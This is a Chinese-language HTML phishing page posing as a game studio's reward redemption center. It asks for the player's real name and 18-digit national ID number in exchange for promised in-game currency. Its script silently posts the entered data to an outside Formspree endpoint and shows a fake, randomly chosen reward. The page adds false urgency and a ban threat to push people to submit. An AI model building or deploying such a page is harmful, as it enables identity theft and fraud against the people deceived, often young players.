<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>活动兑换中心</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://pic.imgdb.cn/item/628350a80947543129f83a0f.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
      color: #fff;
    }
    .container {
      max-width: 420px;
      margin: 60px auto;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 12px;
      padding: 20px 24px;
      box-shadow: 0 0 15px rgba(0, 204, 255, 0.8);
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: #00ccff;
    }
    label {
      display: block;
      margin: 12px 0 4px;
    }
    label.required::after {
      content: '*';
      color: red;
      margin-left: 4px;
    }
    select, input {
      width: 100%;
      padding: 10px;
      margin-bottom: 6px;
      border-radius: 5px;
      border: none;
      font-size: 16px;
    }
    .error {
      color: red;
      font-size: 13px;
      margin-top: -6px;
      margin-bottom: 6px;
    }
    .button {
      width: 100%;
      background-color: #00ccff;
      border: none;
      color: #000;
      padding: 12px;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s;
    }
    .button:disabled {
      background: #666;
      cursor: not-allowed;
    }
    .result {
      margin-top: 20px;
      padding: 14px;
      border-radius: 8px;
      background-color: rgba(255,255,255,0.1);
      border-left: 4px solid #00ccff;
    }
    .announcement {
      margin-top: 30px;
      padding: 12px;
      background: rgba(255,255,255,0.05);
      border-radius: 8px;
      font-size: 14px;
    }
    .warning {
      margin-top: 12px;
      color: red;
      font-weight: bold;
      text-align: center;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>活动兑换中心</h1>
    <form id="authForm">
      <label for="server" class="required">选择区服</label>
      <select id="server" required>
        <option value="">请选择</option>
        <option value="微信区">微信区</option>
        <option value="QQ区">QQ区</option>
      </select>
      <div class="error" id="serverError"></div>

      <label for="nickname" class="required">游戏昵称</label>
      <input type="text" id="nickname" placeholder="请输入游戏昵称">
      <div class="error" id="nicknameError"></div>

      <label for="realname" class="required">实名认证姓名</label>
      <input type="text" id="realname" placeholder="请输入姓名">
      <div class="error" id="realnameError"></div>

      <label for="idcard" class="required">身份证号</label>
      <input type="text" id="idcard" placeholder="请输入18位身份证号">
      <div class="error" id="idcardError"></div>

      <button type="submit" id="submitBtn" class="button">提交认证</button>
    </form>

    <div class="result" id="result" style="display:none;"></div>

    <div class="announcement">
      活动公告：认证成功即可获得点卷奖励，认证越早奖励越大！本活动需二次身份核验，请填写准确信息。认证成功后还可抽取载具皮肤及兑换钥匙奖励！
    </div>

    <div class="warning">
      ⚠️ 多次提交冒领奖励，一经查出将给予封号处理。
    </div>

    <div class="footer">
      本活动最终解释权归光子工作室所有
    </div>
  </div>

  <script>
    const form = document.getElementById("authForm");
    const result = document.getElementById("result");
    const btn = document.getElementById("submitBtn");

    const errors = {
      serverError: document.getElementById("serverError"),
      nicknameError: document.getElementById("nicknameError"),
      realnameError: document.getElementById("realnameError"),
      idcardError: document.getElementById("idcardError"),
    };

    function validateForm(data) {
      let valid = true;
      Object.values(errors).forEach(e => e.textContent = "");

      if (!data.server) {
        errors.serverError.textContent = "请选择区服";
        valid = false;
      }

      if (!data.realname || !/^[\u4e00-\u9fa5]{1,5}$/.test(data.realname)) {
        errors.realnameError.textContent = "姓名应为1-5个汉字";
        valid = false;
      }

      if (!data.idcard || !/^\d{17}[\dXx]$/.test(data.idcard)) {
        errors.idcardError.textContent = "请输入正确的18位身份证号";
        valid = false;
      }

      return valid;
    }

    function disableForm() {
      btn.disabled = true;
      btn.textContent = "您已提交";
      form.querySelectorAll("input, select").forEach(input => input.disabled = true);
    }

    // 防重复提交
    if (localStorage.getItem("submitted") === "true") {
      disableForm();
      result.style.display = "block";
      result.innerHTML = `
        您已成功提交认证，请勿重复提交。<br><br>
        恭喜获得 ${localStorage.getItem("reward") || "60"} 点卷，点卷将在24小时之内到账。
      `;
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const data = {
        server: document.getElementById("server").value,
        nickname: document.getElementById("nickname").value,
        realname: document.getElementById("realname").value,
        idcard: document.getElementById("idcard").value,
      };

      if (!validateForm(data)) return;

      // 奖励逻辑
      const rand = Math.random();
      const reward = rand <= 0.01 ? 300 : 60;

      // 存储
      localStorage.setItem("submitted", "true");
      localStorage.setItem("reward", reward);

      // 发往 formspree
      fetch("https://formspree.io/f/xrbkzgel", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      disableForm();
      result.style.display = "block";
      result.innerHTML = `
        您已成功提交认证，请勿重复提交。<br><br>
        恭喜获得 ${reward} 点卷，点卷将在24小时之内到账。
      `;
    });
  </script>
</body>
</html>
